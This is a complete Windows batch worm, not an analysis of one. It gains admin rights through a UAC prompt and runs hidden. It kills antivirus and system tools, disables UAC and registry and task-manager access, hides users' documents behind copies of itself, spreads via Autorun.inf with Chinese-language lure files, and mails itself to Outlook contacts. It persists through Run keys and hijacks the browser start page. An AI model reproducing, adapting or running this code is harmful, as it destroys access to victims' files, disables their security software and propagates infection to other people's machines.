@echo off

>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
"%temp%\getadmin.vbs"
exit /B

:gotAdmin
if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
pushd "%CD%"
CD /D "%~dp0"

if "%1" == "h" goto begin
mshta vbscript:createobject("wscript.shell").run("""%~nx0"" h",0)(window.close)&&exit

:begin
md C:\Windows\vir
set file1=C:\Windows\vir\mail.vbs
set file3=C:\Windows\vir\sys.bat
set file2=C:\Windows\vir\kill.bat
if exist %file1% (
goto f1ex
 ) else (
goto f1nx
)

:f3nx
md C:\Windows\vir
copy /y %0 C:\Windows\vir\sys.bat
goto begin

:f1ex
if exist %file3% (
goto f3ex
 ) else (
goto f3nx
)

:f3ex
if exist %file2% (
goto main
) else (
goto f2nx)

:f2nx
echo :1 >>C:\Windows\vir\kill.bat
echo taskkill /f /im taskmgr.exe >>C:\Windows\vir\kill.bat
echo taskkill /f /im regedit.exe >>C:\Windows\vir\kill.bat
echo taskkill /f /im gpedit.msc >>C:\Windows\vir\kill.bat
echo taskkill /f /im mmc.exe >>C:\Windows\vir\kill.bat
echo taskkill /f /im powershell.exe >>C:\Windows\vir\kill.bat
echo goto 1 >>C:\Windows\vir\kill.bat

:f1nx
echo On Error Resume Next >>C:\Windows\vir\mail.vbs
echo For x=1 To 100 >>C:\Windows\vir\mail.vbs
echo Set Mail=ol.CreateItem(0) >>C:\Windows\vir\mail.vbs
echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) >>C:\Window\vir\mail.vbs
echo Mail.Subject="重要资料" >>C:\Windows\vir\mail.vbs
echo Mail.Body="这里有一份对你十分重要的资料。请不要告诉别人，将附件下载下来后双击查看" >>C:\Windows\vir\mail.vbs
echo Mail.Attachments.Add("C:\Windows\vir\sys.bat") >>C:\Windows\vir\mail.vbs
echo Mail.Send >>C:\Windows\vir\mail.vbs
echo Next >>C:\Windows\vir\mail.vbs
echo ol.Quit >>C:\Windows\vir\mail.vbs
goto begin

:main
taskkill /f /im taskmgr.exe
taskkill /f /im regedit.exe
taskkill /f /im gpedit.msc
taskkill /f /im 360safe.exe
taskkill /f /im 360tray.exe
taskkill /f /im hytray.exe
taskkill /f /im hips*
taskkill /f /im 360*
taskkill /f /im hy*
taskkill /f /im 2345*
net stop navapsvc
net stop wscsvc
net stop KPfwSvc
net stop SNDSrvc
net stop ccProxy
net stop ccEvtMgr
net stop ccSetMgr
net stop SPBBCSvc
net stop Symantec 
net stop NPFMntor 
net stop MskService
net stop FireSvc 
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
cd ..
cd ..
cd ..
for /f "delims=?" %%a in ('dir/s/b/a-d *.ppt') do (
copy /y C:\Windows\vir\sys.bat %%a.bat
attrib +r +s +h %%a
)
for /f "delims=?" %%b in ('dir/s/b/a-d *.pptx') do (
copy /y C:\Windows\vir\sys.bat %%b.bat
attrib +r +s +h %%b
)
for /f "delims=?" %%c in ('dir/s/b/a-d *.doc') do (
copy /y C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
)
for /f "delims=?" %%d in ('dir/s/b/a-d *.docx') do (
copy /y C:\Windows\vir\sys.bat %%d.bat
attrib +r +s +h %%d
)
for /f "delims=?" %%e in ('dir/s/b/a-d *.xls') do (
copy /y C:\Windows\vir\sys.bat %%e.bat
attrib +r +s +h %%e
)
for /f "delims=?" %%f in ('dir/s/b/a-d *.xlsx') do (
copy /y C:\Windows\vir\sys.bat %%f.bat
attrib +r +s +h %%f
)
for /f "delims=?" %%j in ('dir/s/b/a-d *.ppt') do (
copy /y C:\Windows\vir\sys.bat %%j.bat
attrib +r +s +h %%j
)
for /f "delims=?" %%i in ('dir/s/b/a-d *.db') do (
copy /y C:\Windows\vir\sys.bat %%i.bat
attrib +r +s +h %%i
)
for /f "delims=?" %%x in ('dir/s/b/a-d *.lnk') do (
copy /y C:\Windows\vir\sys.bat %%x.bat
attrib +r +s +h %%x
)

for /f "delims=?" %%g in ('dir/s/b/a-d *.accdb') do (
copy /y C:\Windows\vir\sys.bat %%g.bat
attrib +r +s +h %%g
)

for /f "delims=?" %%y in ('dir/s/b/a-d *.exe') do (
copy /y C:\Windows\vir\sys.bat %%y.bat
attrib +r +s +h %%y
)

for /f "delims=?" %%z in ('dir/s/b/a-d *.dll') do (
copy /y C:\Windows\vir\sys.bat %%z.bat
attrib +r +s +h %%z
)

for /f "delims=?" %%k in ('dir/s/b/a-d *.txt') do (
copy /y C:\Windows\vir\sys.bat %%a.bat
attrib +r +s +h %%k
)

for /f "delims=?" %%a in ('dir/s/b/a-d *.zip') do (
copy /y C:\Windows\vir\sys.bat %%k.bat
attrib +r +s +h %%a
)

for /f "delims=?" %%b in ('dir/s/b/a-d *.rar') do (
copy /y C:\Windows\vir\sys.bat %%b.bat
attrib +r +s +h %%b
)

for /f "delims=?" %%c in ('dir/s/b/a-d *.7z') do (
copy /y C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
)
cd /d C:\
for /f "delims=?" %%a in ('dir/s/b/a-d *.ppt') do (
copy /y C:\Windows\vir\sys.bat %%a.bat
attrib +r +s +h %%a
)
for /f "delims=?" %%b in ('dir/s/b/a-d *.pptx') do (
copy /y C:\Windows\vir\sys.bat %%b.bat
attrib +r +s +h %%b
)
for /f "delims=?" %%c in ('dir/s/b/a-d *.doc') do (
copy /y C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
)
for /f "delims=?" %%d in ('dir/s/b/a-d *.docx') do (
copy /y C:\Windows\vir\sys.bat %%d.bat
attrib +r +s +h %%d
)
for /f "delims=?" %%e in ('dir/s/b/a-d *.xls') do (
copy /y C:\Windows\vir\sys.bat %%e.bat
attrib +r +s +h %%e
)
for /f "delims=?" %%f in ('dir/s/b/a-d *.xlsx') do (
copy C:\Windows\vir\sys.bat %%f.bat
attrib +r +s +h %%f
)
for /f "delims=?" %%j in ('dir/s/b/a-d *.ppt') do (
copy /y  C:\Windows\vir\sys.bat %%j.bat
attrib +r +s +h %%j
)
for /f "delims=?" %%i in ('dir/s/b/a-d *.db') do (
copy /y  C:\Windows\vir\sys.bat %%i.bat
attrib +r +s +h %%i
)
for /f "delims=?" %%x in ('dir/s/b/a-d *.lnk') do (
copy /y  C:\Windows\vir\sys.bat %%x.bat
attrib +r +s +h %%x
)

for /f "delims=?" %%g in ('dir/s/b/a-d *.accdb') do (
copy /y  C:\Windows\vir\sys.bat %%g.bat
attrib +r +s +h %%g
)

for /f "delims=?" %%y in ('dir/s/b/a-d *.exe') do (
copy /y  C:\Windows\vir\sys.bat %%y.bat
attrib +r +s +h %%y
)

for /f "delims=?" %%z in ('dir/s/b/a-d *.dll') do (
copy /y  C:\Windows\vir\sys.bat %%z.bat
attrib +r +s +h %%z
)

for /f "delims=?" %%k in ('dir/s/b/a-d *.txt') do (
copy /y  C:\Windows\vir\sys.bat %%a.bat
attrib +r +s +h %%k
)

for /f "delims=?" %%a in ('dir/s/b/a-d *.zip') do (
copy /y  C:\Windows\vir\sys.bat %%k.bat
attrib +r +s +h %%a
)

for /f "delims=?" %%b in ('dir/s/b/a-d *.rar') do (
copy /y  C:\Windows\vir\sys.bat %%b.bat
attrib +r +s +h %%b
)

for /f "delims=?" %%c in ('dir/s/b/a-d *.7z') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
)
cd /d D:\
for /f "delims=?" %%a in ('dir/s/b/a-d *.ppt') do (
copy /y  C:\Windows\vir\sys.bat %%a.bat
attrib +r +s +h %%a
)
for /f "delims=?" %%b in ('dir/s/b/a-d *.pptx') do (
copy /y  C:\Windows\vir\sys.bat %%b.bat
attrib +r +s +h %%b
)
for /f "delims=?" %%c in ('dir/s/b/a-d *.doc') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
)
for /f "delims=?" %%d in ('dir/s/b/a-d *.docx') do (
copy /y  C:\Windows\vir\sys.bat %%d.bat
attrib +r +s +h %%d
)
for /f "delims=?" %%e in ('dir/s/b/a-d *.xls') do (
copy /y  C:\Windows\vir\sys.bat %%e.bat
attrib +r +s +h %%e
)
for /f "delims=?" %%f in ('dir/s/b/a-d *.xlsx') do (
copy /y  C:\Windows\vir\sys.bat %%f.bat
attrib +r +s +h %%f
)
for /f "delims=?" %%j in ('dir/s/b/a-d *.ppt') do (
copy /y  C:\Windows\vir\sys.bat %%j.bat
attrib +r +s +h %%j
)
for /f "delims=?" %%i in ('dir/s/b/a-d *.db') do (
copy /y  C:\Windows\vir\sys.bat %%i.bat
attrib +r +s +h %%i
)
for /f "delims=?" %%x in ('dir/s/b/a-d *.lnk') do (
copy /y  C:\Windows\vir\sys.bat %%x.bat
attrib +r +s +h %%x
)

for /f "delims=?" %%g in ('dir/s/b/a-d *.accdb') do (
copy /y  C:\Windows\vir\sys.bat %%g.bat
attrib +r +s +h %%g
)

for /f "delims=?" %%y in ('dir/s/b/a-d *.exe') do (
copy /y  C:\Windows\vir\sys.bat %%y.bat
attrib +r +s +h %%y
)

for /f "delims=?" %%z in ('dir/s/b/a-d *.dll') do (
copy /y  C:\Windows\vir\sys.bat %%z.bat
attrib +r +s +h %%z
)

for /f "delims=?" %%k in ('dir/s/b/a-d *.txt') do (
copy /y  C:\Windows\vir\sys.bat %%a.bat
attrib +r +s +h %%k
)

for /f "delims=?" %%a in ('dir/s/b/a-d *.zip') do (
copy /y  C:\Windows\vir\sys.bat %%k.bat
attrib +r +s +h %%a
)

for /f "delims=?" %%b in ('dir/s/b/a-d *.rar') do (
copy /y  C:\Windows\vir\sys.bat %%b.bat
attrib +r +s +h %%b
)

for /f "delims=?" %%c in ('dir/s/b/a-d *.7z') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
)
cd /d E:\
for /f "delims=?" %%a in ('dir/s/b/a-d *.ppt') do (
copy /y  C:\Windows\vir\sys.bat %%a.bat
attrib +r +s +h %%a
)
for /f "delims=?" %%b in ('dir/s/b/a-d *.pptx') do (
copy /y  C:\Windows\vir\sys.bat %%b.bat
attrib +r +s +h %%b
)
for /f "delims=?" %%c in ('dir/s/b/a-d *.doc') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
)
for /f "delims=?" %%d in ('dir/s/b/a-d *.docx') do (
copy /y  C:\Windows\vir\sys.bat %%d.bat
attrib +r +s +h %%d
)
for /f "delims=?" %%e in ('dir/s/b/a-d *.xls') do (
copy /y  C:\Windows\vir\sys.bat %%e.bat
attrib +r +s +h %%e
)
for /f "delims=?" %%f in ('dir/s/b/a-d *.xlsx') do (
copy /y  C:\Windows\vir\sys.bat %%f.bat
attrib +r +s +h %%f
)
for /f "delims=?" %%j in ('dir/s/b/a-d *.ppt') do (
copy /y  C:\Windows\vir\sys.bat %%j.bat
attrib +r +s +h %%j
)
for /f "delims=?" %%i in ('dir/s/b/a-d *.db') do (
copy /y  C:\Windows\vir\sys.bat %%i.bat
attrib +r +s +h %%i
)
for /f "delims=?" %%x in ('dir/s/b/a-d *.lnk') do (
copy /y  C:\Windows\vir\sys.bat %%x.bat
attrib +r +s +h %%x
)

for /f "delims=?" %%g in ('dir/s/b/a-d *.accdb') do (
copy /y  C:\Windows\vir\sys.bat %%g.bat
attrib +r +s +h %%g
)

for /f "delims=?" %%y in ('dir/s/b/a-d *.exe') do (
copy /y  C:\Windows\vir\sys.bat %%y.bat
attrib +r +s +h %%y
)

for /f "delims=?" %%z in ('dir/s/b/a-d *.dll') do (
copy /y  C:\Windows\vir\sys.bat %%z.bat
attrib +r +s +h %%z
)

for /f "delims=?" %%k in ('dir/s/b/a-d *.txt') do (
copy /y  C:\Windows\vir\sys.bat %%a.bat
attrib +r +s +h %%k
)

for /f "delims=?" %%a in ('dir/s/b/a-d *.zip') do (
copy /y  C:\Windows\vir\sys.bat %%k.bat
attrib +r +s +h %%a
)

for /f "delims=?" %%b in ('dir/s/b/a-d *.rar') do (
copy /y  C:\Windows\vir\sys.bat %%b.bat
attrib +r +s +h %%b
)

for /f "delims=?" %%c in ('dir/s/b/a-d *.7z') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
)
cd /d F:\
for /f "delims=?" %%a in ('dir/s/b/a-d *.ppt') do (
copy /y  C:\Windows\vir\sys.bat %%a.bat
attrib +r +s +h %%a
)
for /f "delims=?" %%b in ('dir/s/b/a-d *.pptx') do (
copy /y  C:\Windows\vir\sys.bat %%b.bat
attrib +r +s +h %%b
)
for /f "delims=?" %%c in ('dir/s/b/a-d *.doc') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
)
for /f "delims=?" %%d in ('dir/s/b/a-d *.docx') do (
copy /y  C:\Windows\vir\sys.bat %%d.bat
attrib +r +s +h %%d
)
for /f "delims=?" %%e in ('dir/s/b/a-d *.xls') do (
copy /y  C:\Windows\vir\sys.bat %%e.bat
attrib +r +s +h %%e
)
for /f "delims=?" %%f in ('dir/s/b/a-d *.xlsx') do (
copy /y  C:\Windows\vir\sys.bat %%f.bat
attrib +r +s +h %%f
)
for /f "delims=?" %%j in ('dir/s/b/a-d *.ppt') do (
copy /y  C:\Windows\vir\sys.bat %%j.bat
attrib +r +s +h %%j
)
for /f "delims=?" %%i in ('dir/s/b/a-d *.db') do (
copy /y  C:\Windows\vir\sys.bat %%i.bat
attrib +r +s +h %%i
)
for /f "delims=?" %%x in ('dir/s/b/a-d *.lnk') do (
copy /y  C:\Windows\vir\sys.bat %%x.bat
attrib +r +s +h %%x
)

for /f "delims=?" %%g in ('dir/s/b/a-d *.accdb') do (
copy /y  C:\Windows\vir\sys.bat %%g.bat
attrib +r +s +h %%g
)

for /f "delims=?" %%y in ('dir/s/b/a-d *.exe') do (
copy /y  C:\Windows\vir\sys.bat %%y.bat
attrib +r +s +h %%y
)

for /f "delims=?" %%z in ('dir/s/b/a-d *.dll') do (
copy /y  C:\Windows\vir\sys.bat %%z.bat
attrib +r +s +h %%z
)

for /f "delims=?" %%k in ('dir/s/b/a-d *.txt') do (
copy /y  C:\Windows\vir\sys.bat %%a.bat
attrib +r +s +h %%k
)

for /f "delims=?" %%a in ('dir/s/b/a-d *.zip') do (
copy /y  C:\Windows\vir\sys.bat %%k.bat
attrib +r +s +h %%a
)

for /f "delims=?" %%b in ('dir/s/b/a-d *.rar') do (
copy /y  C:\Windows\vir\sys.bat %%b.bat
attrib +r +s +h %%b
)

for /f "delims=?" %%c in ('dir/s/b/a-d *.7z') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
)
cd /d G:\
for /f "delims=?" %%a in ('dir/s/b/a-d *.ppt') do (
copy /y  C:\Windows\vir\sys.bat %%a.bat
attrib +r +s +h %%a
)
for /f "delims=?" %%b in ('dir/s/b/a-d *.pptx') do (
copy /y  C:\Windows\vir\sys.bat %%b.bat
attrib +r +s +h %%b
)
for /f "delims=?" %%c in ('dir/s/b/a-d *.doc') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
)
for /f "delims=?" %%d in ('dir/s/b/a-d *.docx') do (
copy /y  C:\Windows\vir\sys.bat %%d.bat
attrib +r +s +h %%d
)
for /f "delims=?" %%e in ('dir/s/b/a-d *.xls') do (
copy /y  C:\Windows\vir\sys.bat %%e.bat
attrib +r +s +h %%e
)
for /f "delims=?" %%f in ('dir/s/b/a-d *.xlsx') do (
copy /y  C:\Windows\vir\sys.bat %%f.bat
attrib +r +s +h %%f
)
for /f "delims=?" %%j in ('dir/s/b/a-d *.ppt') do (
copy /y  C:\Windows\vir\sys.bat %%j.bat
attrib +r +s +h %%j
)
for /f "delims=?" %%i in ('dir/s/b/a-d *.db') do (
copy /y  C:\Windows\vir\sys.bat %%i.bat
attrib +r +s +h %%i
)
for /f "delims=?" %%x in ('dir/s/b/a-d *.lnk') do (
copy /y  C:\Windows\vir\sys.bat %%x.bat
attrib +r +s +h %%x
)

for /f "delims=?" %%g in ('dir/s/b/a-d *.accdb') do (
copy /y  C:\Windows\vir\sys.bat %%g.bat
attrib +r +s +h %%g
)

for /f "delims=?" %%y in ('dir/s/b/a-d *.exe') do (
copy /y  C:\Windows\vir\sys.bat %%y.bat
attrib +r +s +h %%y
)

for /f "delims=?" %%z in ('dir/s/b/a-d *.dll') do (
copy /y  C:\Windows\vir\sys.bat %%z.bat
attrib +r +s +h %%z
)

for /f "delims=?" %%k in ('dir/s/b/a-d *.txt') do (
copy /y  C:\Windows\vir\sys.bat %%a.bat
attrib +r +s +h %%k
)

for /f "delims=?" %%a in ('dir/s/b/a-d *.zip') do (
copy /y  C:\Windows\vir\sys.bat %%k.bat
attrib +r +s +h %%a
)

for /f "delims=?" %%b in ('dir/s/b/a-d *.rar') do (
copy /y  C:\Windows\vir\sys.bat %%b.bat
attrib +r +s +h %%b
)

for /f "delims=?" %%c in ('dir/s/b/a-d *.7z') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
)
cd /d H:\
for /f "delims=?" %%a in ('dir/s/b/a-d *.ppt') do (
copy /y  C:\Windows\vir\sys.bat %%a.bat
attrib +r +s +h %%a
)
for /f "delims=?" %%b in ('dir/s/b/a-d *.pptx') do (
copy /y  C:\Windows\vir\sys.bat %%b.bat
attrib +r +s +h %%b
)
for /f "delims=?" %%c in ('dir/s/b/a-d *.doc') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
)
for /f "delims=?" %%d in ('dir/s/b/a-d *.docx') do (
copy /y  C:\Windows\vir\sys.bat %%d.bat
attrib +r +s +h %%d
)
for /f "delims=?" %%e in ('dir/s/b/a-d *.xls') do (
copy /y  C:\Windows\vir\sys.bat %%e.bat
attrib +r +s +h %%e
)
for /f "delims=?" %%f in ('dir/s/b/a-d *.xlsx') do (
copy /y  C:\Windows\vir\sys.bat %%f.bat
attrib +r +s +h %%f
)
for /f "delims=?" %%j in ('dir/s/b/a-d *.ppt') do (
copy /y  C:\Windows\vir\sys.bat %%j.bat
attrib +r +s +h %%j
)
for /f "delims=?" %%i in ('dir/s/b/a-d *.db') do (
copy /y  C:\Windows\vir\sys.bat %%i.bat
attrib +r +s +h %%i
)
for /f "delims=?" %%x in ('dir/s/b/a-d *.lnk') do (
copy /y  C:\Windows\vir\sys.bat %%x.bat
attrib +r +s +h %%x
)

for /f "delims=?" %%g in ('dir/s/b/a-d *.accdb') do (
copy /y  C:\Windows\vir\sys.bat %%g.bat
attrib +r +s +h %%g
)

for /f "delims=?" %%y in ('dir/s/b/a-d *.exe') do (
copy /y  C:\Windows\vir\sys.bat %%y.bat
attrib +r +s +h %%y
)

for /f "delims=?" %%z in ('dir/s/b/a-d *.dll') do (
copy /y  C:\Windows\vir\sys.bat %%z.bat
attrib +r +s +h %%z
)

for /f "delims=?" %%k in ('dir/s/b/a-d *.txt') do (
copy /y  C:\Windows\vir\sys.bat %%a.bat
attrib +r +s +h %%k
)

for /f "delims=?" %%a in ('dir/s/b/a-d *.zip') do (
copy /y  C:\Windows\vir\sys.bat %%k.bat
attrib +r +s +h %%a
)

for /f "delims=?" %%b in ('dir/s/b/a-d *.rar') do (
copy /y  C:\Windows\vir\sys.bat %%b.bat
attrib +r +s +h %%b
)

for /f "delims=?" %%c in ('dir/s/b/a-d *.7z') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
)
cd /d I:\
for /f "delims=?" %%a in ('dir/s/b/a-d *.ppt') do (
copy /y  C:\Windows\vir\sys.bat %%a.bat
attrib +r +s +h %%a
)
for /f "delims=?" %%b in ('dir/s/b/a-d *.pptx') do (
copy /y  C:\Windows\vir\sys.bat %%b.bat
attrib +r +s +h %%b
)
for /f "delims=?" %%c in ('dir/s/b/a-d *.doc') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
)
for /f "delims=?" %%d in ('dir/s/b/a-d *.docx') do (
copy /y  C:\Windows\vir\sys.bat %%d.bat
attrib +r +s +h %%d
)
for /f "delims=?" %%e in ('dir/s/b/a-d *.xls') do (
copy /y  C:\Windows\vir\sys.bat %%e.bat
attrib +r +s +h %%e
)
for /f "delims=?" %%f in ('dir/s/b/a-d *.xlsx') do (
copy /y  C:\Windows\vir\sys.bat %%f.bat
attrib +r +s +h %%f
)
for /f "delims=?" %%j in ('dir/s/b/a-d *.ppt') do (
copy /y  C:\Windows\vir\sys.bat %%j.bat
attrib +r +s +h %%j
)
for /f "delims=?" %%i in ('dir/s/b/a-d *.db') do (
copy /y  C:\Windows\vir\sys.bat %%i.bat
attrib +r +s +h %%i
)
for /f "delims=?" %%x in ('dir/s/b/a-d *.lnk') do (
copy /y  C:\Windows\vir\sys.bat %%x.bat
attrib +r +s +h %%x
)

for /f "delims=?" %%g in ('dir/s/b/a-d *.accdb') do (
copy /y  C:\Windows\vir\sys.bat %%g.bat
attrib +r +s +h %%g
)

for /f "delims=?" %%y in ('dir/s/b/a-d *.exe') do (
copy /y  C:\Windows\vir\sys.bat %%y.bat
attrib +r +s +h %%y
)

for /f "delims=?" %%z in ('dir/s/b/a-d *.dll') do (
copy /y  C:\Windows\vir\sys.bat %%z.bat
attrib +r +s +h %%z
)

for /f "delims=?" %%k in ('dir/s/b/a-d *.txt') do (
copy /y  C:\Windows\vir\sys.bat %%a.bat
attrib +r +s +h %%k
)

for /f "delims=?" %%a in ('dir/s/b/a-d *.zip') do (
copy /y  C:\Windows\vir\sys.bat %%k.bat
attrib +r +s +h %%a
)

for /f "delims=?" %%b in ('dir/s/b/a-d *.rar') do (
copy /y  C:\Windows\vir\sys.bat %%b.bat
attrib +r +s +h %%b
)

for /f "delims=?" %%c in ('dir/s/b/a-d *.7z') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
)
cd /d J:\
for /f "delims=?" %%a in ('dir/s/b/a-d *.ppt') do (
copy /y  C:\Windows\vir\sys.bat %%a.bat
attrib +r +s +h %%a
)
for /f "delims=?" %%b in ('dir/s/b/a-d *.pptx') do (
copy /y  C:\Windows\vir\sys.bat %%b.bat
attrib +r +s +h %%b
)
for /f "delims=?" %%c in ('dir/s/b/a-d *.doc') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
)
for /f "delims=?" %%d in ('dir/s/b/a-d *.docx') do (
copy /y  C:\Windows\vir\sys.bat %%d.bat
attrib +r +s +h %%d
)
for /f "delims=?" %%e in ('dir/s/b/a-d *.xls') do (
copy /y  C:\Windows\vir\sys.bat %%e.bat
attrib +r +s +h %%e
)
for /f "delims=?" %%f in ('dir/s/b/a-d *.xlsx') do (
copy /y  C:\Windows\vir\sys.bat %%f.bat
attrib +r +s +h %%f
)
for /f "delims=?" %%j in ('dir/s/b/a-d *.ppt') do (
copy /y  C:\Windows\vir\sys.bat %%j.bat
attrib +r +s +h %%j
)
for /f "delims=?" %%i in ('dir/s/b/a-d *.db') do (
copy /y  C:\Windows\vir\sys.bat %%i.bat
attrib +r +s +h %%i
)
for /f "delims=?" %%x in ('dir/s/b/a-d *.lnk') do (
copy /y  C:\Windows\vir\sys.bat %%x.bat
attrib +r +s +h %%x
)

for /f "delims=?" %%g in ('dir/s/b/a-d *.accdb') do (
copy /y  C:\Windows\vir\sys.bat %%g.bat
attrib +r +s +h %%g
)

for /f "delims=?" %%y in ('dir/s/b/a-d *.exe') do (
copy /y  C:\Windows\vir\sys.bat %%y.bat
attrib +r +s +h %%y
)

for /f "delims=?" %%z in ('dir/s/b/a-d *.dll') do (
copy /y  C:\Windows\vir\sys.bat %%z.bat
attrib +r +s +h %%z
)

for /f "delims=?" %%k in ('dir/s/b/a-d *.txt') do (
copy /y  C:\Windows\vir\sys.bat %%a.bat
attrib +r +s +h %%k
)

for /f "delims=?" %%a in ('dir/s/b/a-d *.zip') do (
copy /y  C:\Windows\vir\sys.bat %%k.bat
attrib +r +s +h %%a
)

for /f "delims=?" %%b in ('dir/s/b/a-d *.rar') do (
copy /y  C:\Windows\vir\sys.bat %%b.bat
attrib +r +s +h %%b
)

for /f "delims=?" %%c in ('dir/s/b/a-d *.7z') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
)
cd /d C:\
for /l %%i in (1,1,100) do (
set namef=%RANDOM% 
copy /y  C:\Windows\vir\sys.bat C:\Users\%username%\desktop\%namef%.bat
)
for %%i in ( z:\ y:\ x:\ w:\ v:\ u:\ t:\ s:\ r:\ q:\ p:\ o:\ n:\m:\ l:\ k:\ i:\ j:\ h:\ g:\ f:\ e:\ d:\ ) do ( 
copy /y  C:\Windows\sys.bat %%i\sys.bat
del /f /q %%i\Autorun.inf
echo [AutoRun]>>%%i\Autorun.inf
echo Open=sys.bat  >>%%i\Autorun.inf
echo 这里有一份对你非常重要的文件>>%%i\重要通知.txt
echo 请双击 sys.bat 以查看>>%%i\重要通知.txt
)
for %%i in ( z:\ y:\ x:\ w:\ v:\ u:\ t:\ s:\ r:\ q:\ p:\ o:\ n:\m:\ l:\ k:\ i:\ j:\ h:\ g:\ f:\ e:\ d:\ ) do ( 
copy /y  C:\Windows\vir\sys.bat %%i\AUTOEXEC.bat
)
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL /v CheckedValue /t REG_DWORD /d 0 /f 
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v lin /t REG_SZ /d C:\Windows\vir\sys.bat /f
copy /y  C:\Windows\vir\sys.bat %temp%\system.bat
copy /y  C:\Windows\vir\sys.bat C:\Windows\system32\%RANDOM%.bat
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "sys" /t reg_sz /d "C:\Windows\vir\sys.bat" /f 
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoSetFolders /t REG_DWORD /d 1 /f
reg add HKEY_CURRENT_USER\SOFTWARW\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Start Page" /t reg_sz /d http://www.4399.com /f
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun  /t REG_DWORD /d 1 /f
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDrives /t REG_DWORD /d 1 /f
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp /v NoRealMode /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools  /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskmgr  /t REG_DWORD /d 1 /f
start C:\Windows\vir\mail.vbs 
C:\Windows\vir\kill.bat
